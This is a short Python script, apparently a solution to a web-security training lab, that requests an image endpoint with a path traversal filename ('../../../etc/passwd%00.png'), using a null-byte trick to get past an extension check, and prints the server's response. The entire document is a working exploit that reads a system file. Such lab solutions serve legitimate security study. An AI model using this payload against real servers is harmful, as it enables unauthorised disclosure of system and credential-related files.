import requests

s = requests.Session()

site = 'ac601f7a1ee23458c01354d6004c0067.web-security-academy.net'
extension = '../../../etc/passwd%00.png'

url = f'''https://{site}/image?filename={extension}'''
resp = s.get(url)
print(resp.text)